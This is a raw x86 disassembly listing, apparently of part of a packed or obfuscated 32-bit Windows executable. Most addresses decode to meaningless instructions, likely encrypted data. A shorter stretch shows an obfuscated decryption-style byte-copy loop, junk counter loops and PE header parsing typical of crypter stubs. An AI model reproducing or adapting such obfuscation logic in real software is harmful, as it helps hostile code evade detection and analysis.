  404a81:	sar    BYTE PTR [ecx+eax*8],0x93
  404a85:	pop    ebp
  404a86:	adc    edx,DWORD PTR [edi]
  404a88:	or     eax,0x7bf59099
  404a8d:	mov    bl,0x99
  404a8f:	jecxz  0x404aee
  404a91:	jmp    0x404a1b
  404a93:	cmc    
  404a94:	scas   al,BYTE PTR es:[edi]
  404a95:	jo     0x404a48
  404a97:	jae    0x404b17
  404a99:	sbb    eax,0x2d511b4f
  404a9e:	das    
  404a9f:	pop    ds
  404aa0:	sar    ah,0xf5
  404aa3:	sub    eax,0xc5ea9b6b
  404aa8:	cmp    ch,BYTE PTR [esi]
  404aaa:	adc    DWORD PTR ds:0xc91c81d7,ebx
  404ab0:	push   ecx
  404ab1:	mov    ds:0x81ae3e60,eax
  404ab6:	dec    edi
  404ab7:	lods   eax,DWORD PTR ds:[esi]
  404ab8:	sub    ecx,DWORD PTR [edi+edx*2]
  404abb:	fsubrp st(5),st
  404abd:	pop    ecx
  404abe:	and    esi,DWORD PTR [edi-0x26]
  404ac1:	adc    eax,0x5bc28643
  404ac6:	data16 jl 0x404adf
  404ac9:	ins    BYTE PTR es:[edi],dx
  404aca:	cmp    al,0x49
  404acc:	adc    eax,0x636f34d4
  404ad1:	dec    esi
  404ad2:	push   cs
  404ad3:	add    BYTE PTR [esi-0x2b562524],0x9e
  404ada:	(bad)  
  404adb:	cwde   
  404adc:	lods   al,BYTE PTR ds:[esi]
  404add:	test   ecx,edi
  404adf:	push   edx
  404ae0:	pushf  
  404ae1:	sub    DWORD PTR [edx+0x66dbd14],ebx
  404ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ae8:	xchg   ebx,eax
  404ae9:	or     DWORD PTR [esi+0x4d],eax
  404aec:	push   esi
  404aed:	mov    ah,0x70
  404aef:	int    0xfa
  404af1:	outs   dx,BYTE PTR ds:[esi]
  404af2:	push   eax
  404af3:	xchg   esi,eax
  404af4:	fisttp DWORD PTR [esp+ecx*2+0x13d786f2]
  404afb:	cmp    ch,ah
  404afd:	and    DWORD PTR [ebx],ebp
  404aff:	add    edx,edx
  404b01:	enter  0x6f70,0x91
  404b05:	xor    eax,0x75b24026
  404b0a:	inc    ebp
  404b0b:	fcom   QWORD PTR [esi+ecx*2+0x4a7940c5]
  404b12:	xor    esp,edx
  404b14:	pop    eax
  404b15:	(bad)  
  404b16:	push   esi
  404b17:	xchg   esp,eax
  404b18:	mov    DWORD PTR [ebx+edi*1-0x36],edi
  404b1c:	les    edx,FWORD PTR [ecx+0x698a9845]
  404b22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b23:	cmp    al,0xa2
  404b25:	popf   
  404b26:	inc    eax
  404b27:	push   ss
  404b28:	leave  
  404b29:	out    dx,eax
  404b2a:	enter  0x7d74,0x54
  404b2e:	push   0xf6025a62
  404b33:	mov    edx,0x75cdf19b
  404b38:	jno    0x404bb3
  404b3a:	xor    al,0x59
  404b3c:	mov    dh,0xf5
  404b3e:	mov    ch,0x46
  404b40:	add    DWORD PTR [ecx+0x5e58fd8],ecx
  404b46:	test   al,0xc4
  404b48:	in     eax,dx
  404b49:	outs   dx,DWORD PTR ds:[esi]
  404b4a:	outs   dx,BYTE PTR ds:[esi]
  404b4b:	mov    esp,ss
  404b4d:	pop    ss
  404b4e:	xchg   edx,eax
  404b4f:	outs   dx,BYTE PTR ds:[esi]
  404b50:	jbe    0x404b8f
  404b52:	mov    ebp,0x4ac5e3bd
  404b57:	cli    
  404b58:	repnz and bh,BYTE PTR [ecx-0x73129d75]
  404b5f:	jb     0x404b0c
  404b61:	mov    gs,eax
  404b63:	sub    eax,0x1d8a3136
  404b68:	mov    cl,ah
  404b6a:	popa   
  404b6b:	sbb    BYTE PTR [edi-0x1c828cdc],al
  404b71:	loop   0x404be0
  404b73:	icebp  
  404b74:	mov    bl,dl
  404b76:	jb     0x404bdf
  404b78:	sahf   
  404b79:	gs pop ebp
  404b7b:	xchg   ebp,eax
  404b7c:	or     BYTE PTR [edi+0x7a],ah
  404b7f:	cmp    eax,0x145c0fa1
  404b84:	mov    ds:0x5b5d0d91,al
  404b89:	add    dl,ch
  404b8b:	call   0xa245:0x2937822e
  404b92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b93:	mov    bl,0x89
  404b95:	push   ds
  404b96:	sbb    BYTE PTR [eax+0x50b12985],ah
  404b9c:	cld    
  404b9d:	out    dx,al
  404b9e:	pop    esp
  404b9f:	outs   dx,DWORD PTR ds:[esi]
  404ba0:	xchg   edx,eax
  404ba1:	(bad)
  404ba5:	adc    eax,0x7e28e04f
  404baa:	retf   
  404bab:	pop    eax
  404bac:	adc    al,0xad
  404bae:	mov    ebx,0xa904967a
  404bb3:	adc    BYTE PTR [edi-0x12],ch
  404bb6:	push   edi
  404bb7:	ret    
  404bb8:	cmp    al,BYTE PTR [esi]
  404bba:	pop    edi
  404bbb:	pop    ebp
  404bbc:	ret    0xe1e2
  404bbf:	jnp    0x404c2a
  404bc1:	add    eax,0x2a868fe3
  404bc6:	ins    DWORD PTR es:[edi],dx
  404bc7:	push   ebp
  404bc8:	pop    ds
  404bc9:	(bad)  
  404bca:	dec    esp
  404bcb:	fidivr WORD PTR [edx]
  404bcd:	pop    esi
  404bce:	loopne 0x404b6f
  404bd0:	shl    DWORD PTR [ebx+0x75],0xa
  404bd4:	xor    BYTE PTR [ecx],cl
  404bd6:	mov    bh,0xaa
  404bd8:	xchg   BYTE PTR [esi+0x1e],bh
  404bdb:	cdq    
  404bdc:	dec    esp
  404bdd:	sub    al,0x3a
  404bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404be0:	push   edx
  404be1:	addr16 jle 0x404bce
  404be4:	adc    ebp,DWORD PTR [eax+ecx*2]
  404be7:	in     al,0xcf
  404be9:	inc    esi
  404bea:	stc    
  404beb:	mov    dl,0x36
  404bed:	ins    BYTE PTR es:[edi],dx
  404bee:	jg     0x404c55
  404bf0:	fst    DWORD PTR es:[ebx+0x501e77be]
  404bf7:	mov    ecx,0x2c0744fb
  404bfc:	ds pop esi
  404bfe:	mov    edx,0x5c995089
  404c03:	inc    ebp
  404c04:	hlt    
  404c05:	dec    eax
  404c06:	jmp    0xd4f24649
  404c0b:	rcl    DWORD PTR [eax],cl
  404c0d:	mov    eax,0x88e54b10
  404c12:	push   0x4b
  404c14:	pop    ss
  404c15:	mov    ecx,0x965fa84e
  404c1a:	xor    bl,BYTE PTR [edi+0x229e4d1e]
  404c20:	jnp    0x404bfa
  404c22:	inc    edx
  404c23:	sbb    BYTE PTR [edi],ah
  404c25:	sbb    DWORD PTR [ebp+eiz*2+0x599b9021],0xffffffdf
  404c2d:	fisub  WORD PTR [ebx]
  404c2f:	inc    ecx
  404c30:	pop    esp
  404c31:	inc    ebx
  404c32:	leave  
  404c33:	lods   al,BYTE PTR ds:[esi]
  404c34:	test   DWORD PTR [eax],edi
  404c36:	(bad)  
  404c37:	pusha  
  404c38:	xchg   ebx,eax
  404c39:	in     eax,dx
  404c3a:	test   eax,0xc7c5bd6c
  404c3f:	outs   dx,DWORD PTR ds:[esi]
  404c40:	adc    ebp,edx
  404c42:	into   
  404c43:	inc    ebx
  404c44:	es in  eax,dx
  404c46:	and    BYTE PTR [edx-0x78],cl
  404c49:	loope  0x404c96
  404c4b:	fbld   TBYTE PTR [ecx-0xf5c77e9]
  404c51:	fimul  WORD PTR [ecx+0x50]
  404c54:	pop    ebp
  404c55:	arpl   WORD PTR [edx],sp
  404c57:	xchg   ebp,eax
  404c58:	push   ecx
  404c59:	fldenv [esi+eax*1]
  404c5c:	scas   eax,DWORD PTR es:[edi]
  404c5d:	inc    edx
  404c5e:	and    eax,0x330d377a
  404c63:	push   eax
  404c64:	imul   ebx,ebx,0xcc1773f0
  404c6a:	cmp    DWORD PTR [eax+eax*2],esp
  404c6d:	mov    dl,0xc8
  404c6f:	mov    eax,0xed222171
  404c74:	ss (bad) 
  404c76:	loop   0x404cd1
  404c78:	cli    
  404c79:	dec    ecx
  404c7a:	enter  0x1932,0xe1
  404c7e:	rcr    BYTE PTR [edi],0x50
  404c81:	sti    
  404c82:	imul   ebx,DWORD PTR [edx+0x5cd965],0x327b7d7d
  404c8c:	adc    eax,0x60f9152
  404c91:	dec    eax
  404c92:	cdq    
  404c93:	push   es
  404c94:	push   0x93bb87c9
  404c99:	mov    bl,BYTE PTR [edx-0x5e5d221e]
  404c9f:	jg     0x404d19
  404ca1:	leave  
  404ca2:	sub    ebx,DWORD PTR [ebx]
  404ca4:	in     eax,dx
  404ca5:	cmp    eax,0xbcb923c
  404caa:	xor    ch,dh
  404cac:	fstp   DWORD PTR [edi+0x1e9b7027]
  404cb2:	push   esp
  404cb3:	(bad)  
  404cb4:	adc    ecx,DWORD PTR [edi-0x77bf3718]
  404cba:	jl     0x404c52
  404cbc:	push   0xffffffdc
  404cbe:	dec    bl
  404cc0:	in     eax,0x61
  404cc2:	add    DWORD PTR ds:0xeaec2629,edx
  404cc8:	or     DWORD PTR [eax-0x794899e3],ebp
  404cce:	pop    DWORD PTR [edi+0x1512c677]
  404cd4:	jp     0x404c92
  404cd6:	adc    al,0x3b
  404cd8:	cmp    dh,ah
  404cda:	or     BYTE PTR [edi+esi*4-0x60],al
  404cde:	cmp    eax,DWORD PTR [ecx+edi*1]
  404ce1:	pop    eax
  404ce2:	sbb    eax,0xdb56c48c
  404ce7:	mov    ah,BYTE PTR [ebx]
  404ce9:	sub    eax,0x9d468d6f
  404cee:	test   al,0x34
  404cf0:	xchg   ecx,eax
  404cf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cf2:	fiadd  WORD PTR [edi]
  404cf4:	xor    al,0x9f
  404cf6:	and    ebp,DWORD PTR [eax]
  404cf8:	ret    0xde1b
  404cfb:	add    al,0x9c
  404cfd:	js     0x404cdc
  404cff:	mov    ch,0x33
  404d01:	and    al,0x66
  404d03:	pop    esp
  404d04:	jle    0x404d4c
  404d06:	int3   
  404d07:	xor    edx,DWORD PTR [ecx+0x13]
  404d0a:	pop    ss
  404d0b:	dec    ebp
  404d0c:	sar    BYTE PTR [ebx],cl
  404d0e:	adc    DWORD PTR [edi-0xe],ebp
  404d11:	rcr    BYTE PTR [ecx],1
  404d13:	mov    cl,0x94
  404d15:	xchg   ecx,eax
  404d16:	stos   DWORD PTR es:[edi],eax
  404d17:	or     ebp,0xffffffbe
  404d1a:	or     al,0xce
  404d1c:	xchg   edi,eax
  404d1d:	jne    0x404d48
  404d1f:	hlt    
  404d20:	aaa    
  404d21:	jg     0x404d16
  404d23:	stos   DWORD PTR es:[edi],eax
  404d24:	push   ebx
  404d25:	mov    dl,0x99
  404d27:	cmp    DWORD PTR [ebp+0x58],0xffffffb1
  404d2b:	nop
  404d2c:	mov    cl,0x5e
  404d2e:	stc    
  404d2f:	test   al,0xe6
  404d31:	ja     0x404cc9
  404d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d34:	inc    ecx
  404d35:	pushf  
  404d36:	fnstenv [ebx+0x133674d9]
  404d3c:	push   es
  404d3d:	add    ecx,edi
  404d3f:	xchg   edx,eax
  404d40:	call   FWORD PTR [eax]
  404d42:	in     eax,dx
  404d43:	iret   
  404d44:	sbb    BYTE PTR [ebx-0x16],cl
  404d47:	xchg   ebx,eax
  404d48:	dec    esp
  404d49:	xchg   edx,eax
  404d4a:	pop    ebx
  404d4b:	and    BYTE PTR [ebp-0x7fc822fe],dh
  404d51:	jns    0x404d00
  404d53:	and    al,0x13
  404d55:	push   esi
  404d56:	enter  0x36e0,0xd3
  404d5a:	and    BYTE PTR [ebx-0x75],bl
  404d5d:	gs call 0x6f0beead
  404d63:	mov    dh,0x67
  404d65:	sahf   
  404d66:	loopne 0x404d41
  404d68:	mov    al,0x93
  404d6a:	sbb    eax,0x9d3b98e3
  404d6f:	push   ss
  404d70:	pushf  
  404d71:	fsub   QWORD PTR [ebx+0x36]
  404d74:	shl    DWORD PTR [ecx+0x5d],0x52
  404d78:	cmc    
  404d79:	(bad)
  404d7c:	test   DWORD PTR [esi],esi
  404d7e:	push   ebp
  404d7f:	dec    eax
  404d80:	cmp    cl,dl
  404d82:	and    eax,0x5d048d81
  404d87:	daa    
  404d88:	adc    ch,bl
  404d8a:	pop    esp
  404d8b:	xor    edx,DWORD PTR [ebx+0x5c]
  404d8e:	test   al,0xa7
  404d90:	cmp    eax,0x8d49dbc2
  404d95:	ficom  WORD PTR [eax+0x336dc8c5]
  404d9b:	test   eax,0x406af1a6
  404da0:	sar    esi,cl
  404da2:	loop   0x404dd8
  404da4:	mov    dh,0xf7
  404da6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404da7:	aam    0xc1
  404da9:	sub    esp,DWORD PTR [ecx-0x36]
  404dac:	aam    0xee
  404dae:	arpl   si,bp
  404db0:	fidivr DWORD PTR [esi+esi*8-0x1ea58197]
  404db7:	cmc    
  404db8:	push   es
  404db9:	xchg   esi,eax
  404dba:	aad    0xc7
  404dbc:	scas   al,BYTE PTR es:[edi]
  404dbd:	hlt    
  404dbe:	push   ecx
  404dbf:	ffree  st(0)
  404dc1:	popf   
  404dc2:	aas    
  404dc3:	mov    al,ds:0x4d63ad58
  404dc8:	out    dx,eax
  404dc9:	sbb    BYTE PTR [ecx-0x7a7b7325],bl
  404dcf:	ja     0x404e4b
  404dd1:	int3   
  404dd2:	and    eax,0x7457c0e9
  404dd7:	pop    ebx
  404dd8:	pop    esi
  404dd9:	mov    eax,ds:0xef58a57a
  404dde:	sub    BYTE PTR [esi-0x73],al
  404de1:	frstor [esi+0x70bd0bd5]
  404de7:	cwde   
  404de8:	clc    
  404de9:	ins    DWORD PTR es:[edi],dx
  404dea:	pop    ss
  404deb:	push   esi
  404dec:	sar    dl,1
  404dee:	sbb    DWORD PTR [eax-0x1fcaa0ac],ebp
  404df4:	sbb    al,0xf9
  404df6:	pushf  
  404df7:	sub    eax,0x8885ad68
  404dfc:	mov    ecx,?
  404dfe:	in     eax,dx
  404dff:	into   
  404e00:	xchg   esp,eax
  404e01:	ror    DWORD PTR [edx+0x42843f5e],1
  404e07:	cmp    eax,0x35344bc8
  404e0c:	fisttp WORD PTR [edi+0x24]
  404e0f:	jo     0x404e54
  404e11:	mov    cl,0xd5
  404e13:	inc    edi
  404e14:	sub    eax,0x10267c2d
  404e19:	mov    ecx,0x82ced3b
  404e1e:	xchg   esi,eax
  404e1f:	jmp    edi
  404e21:	or     dl,BYTE PTR [edx]
  404e23:	(bad)  
  404e24:	leave  
  404e25:	clc    
  404e26:	shl    DWORD PTR [edx-0x3a530cce],cl
  404e2c:	mov    ds:0x9ce73cb2,al
  404e31:	push   ss
  404e32:	test   eax,0x811370ea
  404e37:	adc    al,0xd0
  404e39:	fiadd  WORD PTR [ebx]
  404e3b:	or     al,0x43
  404e3d:	in     al,0x0
  404e3f:	lods   eax,DWORD PTR ds:[esi]
  404e40:	aam    0x69
  404e42:	std    
  404e43:	mov    ss,WORD PTR [ebx-0x10]
  404e46:	xchg   esp,eax
  404e47:	or     al,0x23
  404e49:	cmp    eax,0xfe928d2b
  404e4e:	pop    esp
  404e4f:	sbb    esp,DWORD PTR [eax+0x72]
  404e52:	es pop ebp
  404e54:	cwde   
  404e55:	and    ch,BYTE PTR [eax+0x43]
  404e58:	mov    edx,0xa4b46731
  404e5d:	add    al,bh
  404e5f:	inc    BYTE PTR [ecx+0x60ca9d5e]
  404e65:	stos   DWORD PTR es:[edi],eax
  404e66:	stc    
  404e67:	push   es
  404e68:	inc    esi
  404e69:	out    dx,al
  404e6a:	or     dl,dh
  404e6c:	adc    eax,0xedc84e28
  404e71:	test   eax,0x5d107d12
  404e76:	jmp    0x124dad17
  404e7b:	xchg   ebx,eax
  404e7c:	mov    dl,0xb5
  404e7e:	loopne 0x404eab
  404e80:	mov    ss,WORD PTR [esi]
  404e82:	fprem1 
  404e84:	ret    
  404e85:	jmp    0x82e2:0xe19e340a
  404e8c:	mov    edi,0xa22d2dd0
  404e91:	add    DWORD PTR [esi+0x4c],0x2e
  404e95:	scas   al,BYTE PTR es:[edi]
  404e96:	bound  esp,QWORD PTR [edx]
  404e98:	or     eax,DWORD PTR [eax+0x66]
  404e9b:	push   edx
  404e9c:	jge    0x404e85
  404e9e:	inc    edx
  404e9f:	mov    ?,WORD PTR [ecx]
  404ea1:	int3   
  404ea2:	fnstsw WORD PTR [ebp-0x2]
  404ea5:	fs add al,0xce
  404ea8:	mov    edi,0xe0a510be
  404ead:	pop    eax
  404eae:	ret    0xa005
  404eb1:	push   eax
  404eb2:	mov    al,0x45
  404eb4:	mov    ds:0xdbbb5fee,eax
  404eb9:	dec    ecx
  404eba:	add    eax,0xc267727e
  404ebf:	fcom   DWORD PTR [ecx-0x7c318cce]
  404ec5:	pop    es
  404ec6:	adc    al,0xd3
  404ec8:	or     DWORD PTR [eax],ebx
  404eca:	cmp    al,BYTE PTR [ecx-0x31c775b3]
  404ed0:	scas   al,BYTE PTR es:[edi]
  404ed1:	iret   
  404ed2:	mov    edx,DWORD PTR [eax]
  404ed4:	sub    eax,0x9d966988
  404ed9:	adc    DWORD PTR [ebx],eax
  404edb:	inc    esi
  404edc:	std    
  404edd:	mov    ds:0x3f49a5f0,al
  404ee2:	add    BYTE PTR [ebp-0x1cf590ca],0x99
  404ee9:	dec    ebp
  404eea:	call   0x65a0:0x33ab5dbd
  404ef1:	add    eax,0xf8fe1ce9
  404ef6:	jb     0x404f26
  404ef8:	add    BYTE PTR ds:0x15d4f314,cl
  404efe:	adc    eax,0x1fbb310e
  404f03:	xor    BYTE PTR [ecx+0x5e],cl
  404f06:	mov    eax,0xa089aa29
  404f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f0c:	sbb    bl,dl
  404f0e:	push   ecx
  404f0f:	jae    0x404f24
  404f11:	xchg   esp,eax
  404f12:	fcmovbe st,st(2)
  404f14:	rcl    ebp,0x42
  404f17:	inc    edi
  404f18:	xchg   ebx,eax
  404f19:	ins    BYTE PTR es:[edi],dx
  404f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f1b:	add    eax,0x7f00327
  404f20:	mov    al,0x7a
  404f22:	and    bl,BYTE PTR [ecx+esi*2-0x783ec51c]
  404f29:	cmp    eax,0x8531ea33
  404f2e:	loop   0x404eed
  404f30:	push   edx
  404f31:	iret   
  404f32:	iret   
  404f33:	push   edi
  404f34:	xor    eax,0xaaab1900
  404f39:	adc    BYTE PTR [eax],ch
  404f3b:	pop    ss
  404f3c:	loopne 0x404f32
  404f3e:	jnp    0x404ef7
  404f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f41:	fisubr DWORD PTR [ebx+ebx*4]
  404f44:	xor    ebp,ebx
  404f46:	shl    BYTE PTR [edi+ebp*8-0x2d],cl
  404f4a:	fwait
  404f4b:	sub    ecx,ebx
  404f4d:	sub    al,dh
  404f4f:	data16 shr dl,1
  404f52:	xchg   BYTE PTR [ebp+0x42],ah
  404f55:	inc    esi
  404f56:	inc    edx
  404f57:	mov    esp,ebx
  404f59:	jmp    0x77bcbce7
  404f5e:	and    eax,0x5f01f2b4
  404f63:	jge    0x404fe4
  404f65:	aaa    
  404f66:	hlt    
  404f67:	dec    edx
  404f68:	push   cs
  404f69:	stc    
  404f6a:	push   es
  404f6b:	and    DWORD PTR [edi],edx
  404f6d:	jle    0x404f54
  404f6f:	add    BYTE PTR ds:0x4ac3116f,dl
  404f75:	xchg   BYTE PTR [edi-0xb],dh
  404f78:	ins    DWORD PTR es:[edi],dx
  404f79:	dec    ebx
  404f7a:	fdiv   DWORD PTR [esi-0x13]
  404f7d:	xchg   edx,eax
  404f7e:	or     dl,BYTE PTR [esi+0x78]
  404f81:	mov    ah,0x8
  404f83:	mov    cl,BYTE PTR [ecx]
  404f85:	pop    esp
  404f86:	fadd   QWORD PTR [esi+0x7d]
  404f89:	loope  0x405007
  404f8b:	popf   
  404f8c:	inc    ebp
  404f8d:	mov    eax,0x37c58a4e
  404f92:	xchg   ecx,eax
  404f93:	daa    
  404f94:	adc    eax,0xa91a83f9
  404f99:	call   0xb88c:0xe9458a1f
  404fa0:	add    edx,DWORD PTR [eax+0x7f]
  404fa3:	sbb    eax,0xad3ec89d
  404fa8:	stos   DWORD PTR es:[edi],eax
  404fa9:	inc    edi
  404faa:	sub    al,0xd2
  404fac:	fist   WORD PTR [bx-0x426d]
  404fb1:	mov    edi,0xb65159a1
  404fb6:	dec    esi
  404fb7:	mov    ebp,0xe0b1ddee
  404fbc:	fld    QWORD PTR [edx+0x10104f35]
  404fc2:	or     al,0x61
  404fc4:	mov    ebp,0x6bd6e72e
  404fc9:	jns    0x404f95
  404fcb:	cmp    bl,ch
  404fcd:	jp     0x405020
  404fcf:	jne    0x404f57
  404fd1:	mov    al,ds:0xd288856a
  404fd6:	test   eax,0xf0f0ea7c
  404fdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fdc:	xor    eax,0xe7c6a2a4
  404fe1:	push   ebp
  404fe2:	int3   
  404fe3:	stos   DWORD PTR es:[edi],eax
  404fe4:	add    BYTE PTR [edx-0x3b0250c6],cl
  404fea:	ds hlt 
  404fec:	jmp    0x404fa1
  404fee:	mov    dh,BYTE PTR [esp+edi*2]
  404ff1:	lea    ebx,[eax-0x71]
  404ff4:	aaa    
  404ff5:	addr16 push 0x34
  404ff8:	xor    al,BYTE PTR [ebx-0x4a]
  404ffb:	aas    
  404ffc:	add    esp,DWORD PTR [edi]
  404ffe:	loop   0x405029
  405000:	inc    esp
  405001:	fild   WORD PTR ds:[ecx]
  405004:	fisubr DWORD PTR [ecx]
  405006:	mov    ds:0xa913339a,eax
  40500b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40500c:	int    0x3e
  40500e:	add    BYTE PTR [edi-0x70],cl
  405011:	mov    DWORD PTR ds:0xa72b5a5f,esp
  405017:	(bad)  
  405018:	jno    0x404fd4
  40501a:	or     DWORD PTR [ebx-0x4378ed7a],edx
  405020:	and    al,0x20
  405022:	mov    eax,DWORD PTR [ecx]
  405024:	out    0x18,eax
  405026:	inc    esp
  405027:	jmp    0x2b66:0x91fc8f92
  40502e:	jne    0x405012
  405030:	les    ebp,FWORD PTR ds:0x3329
  405035:	rol    BYTE PTR [ecx+0x42c0140d],0x0
  40503c:	add    al,0xa0
  40503e:	inc    edx
  40503f:	add    BYTE PTR [ebx],dh
  405041:	retf   0xd81
  405044:	adc    al,dl
  405046:	inc    edx
  405047:	add    BYTE PTR [ebp+0x300000d],ch
  40504d:	into   
  40504e:	add    edi,0xfabdbee9
  405054:	mov    DWORD PTR ds:0x42a014,0x6728
  40505e:	adc    eax,0xffffffff
  405061:	and    DWORD PTR ds:0x429014,0x42a000
  40506b:	xor    eax,0x0
  40506e:	mov    DWORD PTR [ebp-0xc],eax
  405071:	push   ebx
  405072:	add    DWORD PTR ds:0x42a000,ebx
  405078:	xor    ebx,ebx
  40507a:	xor    edi,0x8a29a12b
  405080:	sbb    eax,0xb3d
  405085:	mov    eax,ecx
  405087:	add    eax,0xfabdbee9
  40508c:	mov    DWORD PTR ds:0x42d000,0x688f
  405096:	adc    ebx,0xffffffff
  405099:	xor    eax,0x8a29a12b
  40509e:	or     DWORD PTR ds:0x42a010,0x42900c
  4050a8:	xor    ebx,0x0
  4050ab:	mov    DWORD PTR ds:0x429024,0x3d4a
  4050b5:	cmp    eax,edi
  4050b7:	jne    0x4050d6
  4050bd:	cmp    ebx,DWORD PTR [ebp-0xc]
  4050c0:	je     0x40513e
  4050c6:	jmp    0x4050d6
  4050cb:	or     esi,DWORD PTR ds:0x42b01c
  4050d1:	mov    esi,0x3272e0
  4050d6:	mov    eax,DWORD PTR [ebp-0x4]
  4050d9:	mov    edi,DWORD PTR [ebp-0x8]
  4050dc:	xor    edi,edx
  4050de:	add    edi,esi
  4050e0:	mov    esi,DWORD PTR [ebp+0x8]
  4050e3:	imul   edi,ecx
  4050e6:	mov    ebx,DWORD PTR [ebp+0xc]
  4050e9:	xor    eax,edx
  4050eb:	add    eax,ecx
  4050ed:	mov    al,BYTE PTR [ebx+eax*1+0x3272e0]
  4050f4:	mov    BYTE PTR [edi+esi*1],al
  4050f7:	mov    eax,DWORD PTR [ebp-0x8]
  4050fa:	mov    esi,DWORD PTR [ebp+0x10]
  4050fd:	xor    eax,edx
  4050ff:	xor    ebx,ebx
  405101:	add    esi,0xfabdbee9
  405107:	adc    ebx,0xffffffff
  40510a:	lea    ecx,[ecx+eax*1+0x3272e0]
  405111:	xor    edi,edi
  405113:	xor    esi,0x8a29a12b
  405119:	xor    ebx,0x0
  40511c:	mov    eax,ecx
  40511e:	add    eax,0xfabdbee9
  405123:	adc    edi,0xffffffff
  405126:	xor    eax,0x8a29a12b
  40512b:	xor    edi,0x0
  40512e:	cmp    eax,esi
  405130:	jne    0x4050cb
  405136:	cmp    edi,ebx
  405138:	jne    0x4050cb
  40513e:	mov    eax,0xf89c85b8
  405143:	pop    ebx
  405144:	pop    edi
  405145:	pop    esi
  405146:	leave  
  405147:	ret    0xc
  40514a:	push   ebp
  40514b:	mov    ebp,esp
  40514d:	push   ecx
  40514e:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  405155:	sub    ecx,0x3f14
  40515b:	mov    eax,DWORD PTR [ebp+0x8]
  40515e:	and    DWORD PTR ds:0x42b008,0x0
  405168:	xor    edx,edx
  40516a:	add    edx,DWORD PTR ds:0x42b008
  405170:	inc    edx
  405171:	mov    DWORD PTR ds:0x42b008,edx
  405177:	cmp    DWORD PTR ds:0x42b008,0xc
  40517e:	jne    0x4051a5
  405184:	push   DWORD PTR [ebp-0x10]
  405187:	push   DWORD PTR [ebp-0xc]
  40518a:	push   0x429000
  40518f:	push   0x12c2
  405194:	push   0x648f
  405199:	push   DWORD PTR [ebp-0x14]
  40519c:	push   DWORD PTR [ebp-0x20]
  40519f:	call   DWORD PTR ds:0x42ec7f
  4051a5:	cmp    DWORD PTR ds:0x42b008,0xb
  4051ac:	jne    0x4051bf
  4051b2:	mov    edx,DWORD PTR ds:0x42b008
  4051b8:	inc    edx
  4051b9:	mov    DWORD PTR ds:0x42b008,edx
  4051bf:	cmp    DWORD PTR ds:0x42b008,0x15
  4051c6:	jb     0x405168
  4051cc:	and    DWORD PTR ds:0x42900c,0x0
  4051d6:	mov    edx,DWORD PTR ds:0x42900c
  4051dc:	inc    edx
  4051dd:	mov    DWORD PTR ds:0x42900c,edx
  4051e3:	cmp    DWORD PTR ds:0x42900c,0xd
  4051ea:	jne    0x40520d
  4051f0:	push   0x42b018
  4051f5:	push   0x46e1
  4051fa:	push   0x42e0d9
  4051ff:	push   DWORD PTR [ebp-0x1c]
  405202:	push   0x1518
  405207:	call   DWORD PTR ds:0x42ec83
  40520d:	cmp    DWORD PTR ds:0x42900c,0xc
  405214:	jne    0x405229
  40521a:	xor    edx,edx
  40521c:	add    edx,DWORD PTR ds:0x42900c
  405222:	inc    edx
  405223:	mov    DWORD PTR ds:0x42900c,edx
  405229:	cmp    DWORD PTR ds:0x42900c,0x14
  405230:	jb     0x4051d6
  405236:	movsx  eax,BYTE PTR [eax]
  405239:	mov    edx,0x3272e0
  40523e:	sub    eax,edx
  405240:	mov    ecx,0x7510899
  405245:	xor    eax,ecx
  405247:	cmp    eax,0xf89c85f4
  40524c:	jne    0x40527b
  405252:	mov    eax,DWORD PTR [ebp+0x8]
  405255:	push   esi
  405256:	mov    esi,DWORD PTR [ebp+0x8]
  405259:	add    esi,DWORD PTR [eax+0x3c]
  40525c:	mov    DWORD PTR [ebp+0x8],esi
  40525f:	mov    eax,DWORD PTR [ebp-0x4]
  405262:	mov    esi,DWORD PTR [ebp+0x8]
  405265:	xor    eax,ecx
  405267:	add    eax,edx
  405269:	cmp    DWORD PTR [esi+0x54],eax
  40526c:	pop    esi
  40526d:	je     0x40527b
  405273:	mov    eax,DWORD PTR [ebp+0x8]
  405276:	jmp    0x405282
  40527b:	mov    eax,DWORD PTR [ebp-0x4]
  40527e:	xor    eax,ecx
  405280:	add    eax,edx
  405282:	leave  
  405283:	ret    0x4
  405286:	push   ebp
  405287:	mov    ebp,esp
  405289:	sub    esp,0x40
  40528c:	push   ebx
  40528d:	sub    DWORD PTR ds:0x42b010,0x42c014
  405297:	push   esi
  405298:	mov    DWORD PTR ds:0x42d018,0x7544
  4052a2:	push   edi
  4052a3:	add    DWORD PTR ds:0x42a004,0x429008
  4052ad:	lea    eax,[ebp-0x24]
  4052b0:	push   eax
  4052b1:	sub    DWORD PTR ds:0x42c014,0x154
  4052bb:	lea    eax,[ebp-0x20]
  4052be:	add    DWORD PTR ds:0x42a01c,0x42a000
  4052c8:	push   eax
  4052c9:	call   DWORD PTR ds:0x42ec87
  4052cf:	xor    DWORD PTR ds:0x429008,0x42d01c
  4052d9:	push   0x21
  4052db:	sbb    DWORD PTR ds:0x42d01c,0x42b014
  4052e5:	jmp    0x40766a
  4052ea:	push   ss
  4052eb:	xor    BYTE PTR [ecx-0xb6c4a5d],0x77
  4052f2:	es loop 0x4052d5
  4052f5:	and    DWORD PTR [edx+0x26f73ac],ebp
  4052fb:	pop    edi
  4052fc:	jp     0x405378
  4052fe:	add    bl,BYTE PTR [edi+0x7a]
  405301:	jp     0x4052e3
  405303:	add    bl,BYTE PTR ss:[edx-0x4fda3040]
  40530a:	push   ebp
  40530b:	test   BYTE PTR [esi-0x75bf9817],bh
  405311:	pop    ebp
  405312:	repnz leave 
  405314:	push   ecx
  405315:	or     edx,eax
  405317:	lock cmp BYTE PTR [edx-0x665fd2a7],dl
  40531e:	xor    edx,0xffffffe4
  405321:	pop    es
